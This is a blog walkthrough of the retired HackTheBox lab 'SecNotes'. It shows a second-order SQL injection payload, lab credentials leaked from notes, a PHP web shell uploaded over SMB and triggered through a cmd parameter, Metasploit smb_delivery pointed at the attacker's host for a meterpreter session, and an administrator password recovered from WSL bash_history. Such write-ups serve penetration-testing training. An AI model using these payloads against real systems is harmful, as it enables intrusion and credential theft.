@@ -1,0 +1,141 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">HacktheBox SecNotes Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-secnotes-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-01-21T18:13:53+00:00">January 21, 2019</time><time class="updated" datetime="2025-06-29T19:47:05+00:00">June 29, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we are going to solve another CTF challenge “SecNotes”. SecNotes is a retired vulnerable lab presented by Hack the Box for helping pentesters to perform online penetration testing according to their experience. They have a collection of vulnerable labs as challenges; ranging from beginners to expert level.</span></p>
+<p><span style="color: #000000;"><strong>Level: </strong>Easy</span></p>
+<p><span style="color: #000000;"><strong>Task</strong>: To find user.txt and root.txt file</span></p>
+<h3><span style="color: #800000;"><strong>Penetration Methodology</strong>:</span></h3>
+<ol>
+<li><span style="color: #000000;"><strong>Scanning Network</strong></span></li>
+</ol>
+<ul>
+<li><span style="color: #000000;">TCP and UDP ports scanning (nmap).</span></li>
+</ul>
+<ol start="2">
+<li><span style="color: #000000;"><strong>Testing port 80</strong></span></li>
+</ol>
+<ul>
+<li><span style="color: #000000;">Exploiting 2<sup>nd</sup> order SQL injection on sign up form.</span></li>
+<li><span style="color: #000000;">Retrieving all the notes in the system.</span></li>
+<li><span style="color: #000000;">Retrieving “tyler’s” account password.</span></li>
+</ul>
+<ol start="3">
+<li><span style="color: #000000;"><strong>SMB (port 445) penetration</strong></span></li>
+</ol>
+<ul>
+<li><span style="color: #000000;">Accessing victim shell using smbclient.</span></li>
+<li><span style="color: #000000;">Uploading simple-backdoor.php on victim’s machine.</span></li>
+<li><span style="color: #000000;">Triggering backdoor via a browser.</span></li>
+<li><span style="color: #000000;">Exploiting newly created RCE using Metasploit’s smb_delivery exploit.</span></li>
+<li><span style="color: #000000;">Reading the user.txt flag.</span></li>
+</ul>
+<ol start="4">
+<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span></li>
+</ol>
+<ul>
+<li><span style="color: #000000;">Discovering a Windows Subsystem for Linux (WSL).</span></li>
+<li><span style="color: #000000;">Obtaining bash shell from bash.exe.</span></li>
+<li><span style="color: #000000;">Reading administrator password from bash_history.</span></li>
+<li><span style="color: #000000;">Connecting to Administrator using SMB.</span></li>
+<li><span style="color: #000000;">Reading root.txt flag.</span></li>
+</ul>
+<h3><span style="color: #800000;">Scanning Network</span></h3>
+<p><span style="color: #000000;">Without any further ado, let’s dive right into it.</span></p>
+<p><span style="color: #000000;">The first step as always is to perform a nmap scan. We performed an all ports system scan here.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -p- -sV 10.10.10.97</pre>
+<p><span style="color: #000000;">That told us there are three ports open:</span></p>
+<p><span style="color: #000000;">80- web server</span></p>
+<p><span style="color: #000000;">445- smb server</span></p>
+<p><span style="color: #000000;">8808- web server</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-6HLt5SxlG9I/XEYJ7jQXnRI/AAAAAAAAcLo/F77fKG49bhs1GSyB1ypZnrkBtKLHrtL5gCLcBGAs/s1600/1.png"/></span></p>
+<h3><span style="color: #800000;">Testing port 80</span></h3>
+<p><span style="color: #000000;">We launched the website on port 80 only to discover a login form.</span></p>
+<p><span style="color: #000000;">After playing around with the page sources and source code checking we didn’t find anything useful.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-ZWfgyhwI49s/XEYJ8l-53aI/AAAAAAAAcL4/qaEdtm29doscoeZelf-x9ErLk5qX0dSiQCLcBGAs/s1600/2.png"/></span></p>
+<p><span style="color: #000000;">But there was a sign-up option too. We signed up using a random name and password and it seemed to lead us to an account where you could take notes and delete them and also change the password.</span></p>
+<p><span style="color: #000000;">We tried inserting SQL injection queries in the login form and nothing showed up. Then we tried inserting 2<sup>nd</sup> order SQL injection which is nothing but inserting SQL injection queries on the sign-up form itself hoping that the server side script shows any unusual behavior and reveals some database information.</span></p>
+<p><span style="color: #000000;">According to PortSwigger: “<em>Second-order SQL injection arises when user-supplied data is stored by the application and later incorporated into SQL queries in an unsafe way. To detect the vulnerability, it is normally necessary to submit suitable data in one location, and then use some other application function that processes the data in an unsafe way.</em>”</span></p>
+<p><span style="color: #000000;">The query that we used was:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Username: ' or 1='1
+Password: ' or 1='1
+Confirm password: ' or 1='1</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-b2p-79V-Ia0/XEYJ8xX68jI/AAAAAAAAcL8/HYbhA_3pecgPabZHYEt_FgR_s3DxHoZdACLcBGAs/s1600/3.png"/></span></p>
+<p><span style="color: #000000;">It hit successfully and opened up a user account. Seemed like the heading was causing this 2<sup>nd</sup> order SQLi vulnerability. But it solved our purpose and gave us three notes from the database. The third one had something that seemed like the username and password of a service.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">\\secnotes.htb\new-site
+tyler / 92g!mA8BGjOirkL%OG*&amp;</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-GVDmirRxqKM/XEYJ9Y5nstI/AAAAAAAAcMA/bgggYr0byhsMopm7iYCFkLhFoG9MQUR5gCLcBGAs/s1600/4.png"/></span></p>
+<h3><span style="color: #800000;">SMB (port 445) penetration</span></h3>
+<p><span style="color: #000000;">Tyler seems to be a person responsible for people’s queries. After obtaining Tyler’s password the first guess was logging into SMB server running on port 445.</span></p>
+<p><span style="color: #000000;">For the purpose we used smbclient. Once we successfully logged into the system we listed the directories using ls command.</span></p>
+<p><span style="color: #000000;">This seems like a different website than the one on port 80. Maybe this is the one on port 8808.</span></p>
+<p><span style="color: #000000;">So, we uploaded a PHP RCE payload called “simple-backdoor.php” that is present in Kali Linux in the directory: “<strong>/usr/share/webshells/php</strong>” using the put command in smb shell which allows us to run windows commands remotely on the server.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">smbclient –L 10.10.10.97 –U tyler
+password: 92g!mA8BGjOirkL%OG*&amp;
+smbclient //10.10.10.97/new-site -U tyler
+Password: 92g!mA8BGjOirkL%OG*&amp;
+ls
+put simple-backdoor.php
+ls</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-3rxzSe0BKw8/XEYJ9wQIknI/AAAAAAAAcME/agX4KTXBico_L1h2SZsPcjqVDyNGFv_MQCLcBGAs/s1600/5.png"/></span></p>
+<p><span style="color: #000000;">It was now time to trigger the backdoor we just uploaded to check if RCE is even working or not on the server.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">10.10.10.97:8808/simple-backdoor.php?cmd=whoami</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-eSKhuGNWDCc/XEYJ9xbSzrI/AAAAAAAAcMI/E0TmnSUQ87EaTY_FOnrJI0omVoY1cPFuACLcBGAs/s1600/6.png"/></span></p>
+<h4><span style="color: #800000;">Exploiting using Metasploit</span></h4>
+<p><span style="color: #000000;">It seems to be working just fine! Now on a new window in the terminal, we run Metasploit.</span></p>
+<p><span style="color: #000000;">We are looking for an exploit called smb_delivery that triggers RCE on windows and gives a meterpreter session.</span></p>
+<p><span style="color: #000000;">This is only one of the multiple ways through which you could exploit SMB. You can explore multiple ways to do so in our article (SMB penetration testing (Port 445)) <a style="color: #000000;" href="https://www.hackingarticles.in/smb-penetration-testing-port-445/">here</a>.</span></p>
+<p><span style="color: #000000;">So essentially what happens here is that after setting up an LHOST and SRVHOST MSF generates a one-liner that we’ll copy on the RCE vulnerability and will trigger and give us meterpreter.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/windows/smb/smb_delivery
+set LHOST 10.10.14.9
+set SRVHOST 10.10.14.9
+exploit</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-KrceT-9Uf_4/XEYJ-Utc8TI/AAAAAAAAcMM/uP5rZdPYH4Es3eyMJpZ6WcX8ftiCLxCZQCLcBGAs/s1600/7.1.png"/></span></p>
+<p><span style="color: #000000;">Here, 10.10.14.9 is my local IP.</span></p>
+<p><span style="color: #000000;">Alright, so we did as Metasploit asked us to do and ran the rundll32.exe command on the browser where we had RCE vulnerability.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-R34WmgB1O10/XEYJ-vE9H-I/AAAAAAAAcMQ/BAMJ1lZGwWIdodWqOuRiZbWnzt_NUjQpgCLcBGAs/s1600/7.png"/></span></p>
+<p><span style="color: #000000;">Side by side, we checked our terminal and we had gained a meterpreter session! To confirm we are in the windows server we ran sysinfo and pwd to check the current directory we are in.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sysinfo
+pwd</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-8B4_nHE-afk/XEYJ-2p6BzI/AAAAAAAAcMU/uvmbITpUDj8itcNF4RMzHNTWBzVsh_qjgCLcBGAs/s1600/8.png"/></span></p>
+<p><span style="color: #000000;">After playing around a while in the machine, we found user.txt on Tyler’s desktop! But we are only half done till now with no clue where to proceed ahead. Although, a file called bash.lnk caught our attention which is a link to bash and this is weird. What is a bash file doing on a windows system? We proceeded to download the link file on our system and read what’s in it.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd Users
+ls
+cd tyler/Desktop
+cat user.txt
+download bash.lnk /root/</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-XeXweFN6MTI/XEYJ_RiRIjI/AAAAAAAAcMY/yAwj-M-UqyAjWB2ugcV9mW0D0wU9Qbo2gCLcBGAs/s1600/9.png"/></span></p>
+<p><span style="color: #000000;">The language of the link file seemed quite unreadable so we used the strings command to read the bash.lnk file which eventually revealed a link to bash.exe!</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">strings bash.lnk</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-JnJbkR7R114/XEYJ7r5ZzsI/AAAAAAAAcLw/SPGpweqgYwMk6B7QoRzHIkrB_NGpAK8nwCLcBGAs/s1600/11..png"/></span></p>
+<h3><span style="color: #800000;">Privilege Escalation</span></h3>
+<p><span style="color: #000000;">We thought the path to bash.exe was C:\Windows\System32\bash.exe but it was not! The file was missing from the path. We didn’t want to traverse the whole system manually so instead, we used the where command.</span></p>
+<p><span style="color: #000000;">Where command gave us the exact directory of bash.exe and after executing it, we received an improper teletype of bash!</span></p>
+<p><span style="color: #000000;">We used the python one-liner to spawn a proper teletype and proceeded further to read bash_history.</span></p>
+<p><span style="color: #000000;">It told us in clear text about a user Administrator and its password!</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">shell
+where /R c:\ bash.exe
+&lt;running the bash.exe&gt;
+id
+ls –la
+cat .bash_history</pre>
+<p><span style="color: #000000;"><strong><img decoding="async" src="https://3.bp.blogspot.com/-_bpw_TfgT5M/XEYJ7pI91_I/AAAAAAAAcLs/-_Umt6gLS1o7e5lioXZHR2bT6NaFitdFwCLcBGAs/s1600/12.png"/></strong></span></p>
+<p><span style="color: #000000;">It is only obvious now that we have to login to <strong>Administrator</strong> using smbclient command we found in bash_history to get an admin’s smb shell!</span></p>
+<p><span style="color: #000000;"><strong>Final steps: </strong>We traversed the directory to Administrator’s desktop and downloaded root.txt using smb’s “get” command. And there it was! The final flag!</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">smbclient –U 'administrator%u6!4Zwgw0M#^0Bf#Nwnh' \\\\10.10.10.97\\c$
+ls
+cd Users/Administrator/Desktop
+ls
+get root.txt
+cat root.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-R7wCr1yI1hk/XEYJ8uXjYhI/AAAAAAAAcL0/F2LTbHAroMwEZdTTqlwq-DydiMw8Kf2IwCLcBGAs/s1600/13.png"/></span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;">Hope you enjoyed this walkthrough. Do leave a comment with your thoughts and have a nice day!</span></p>
+<p><span style="color: #000000;"><strong>Author: Harshit Rajpal </strong>is an InfoSec researcher and a left and right brain thinker. Contact<strong> <a class="broken_link" style="color: #000000;" href="https://in.linkedin.com/in/harshit-rajpal-79bb43103">here</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
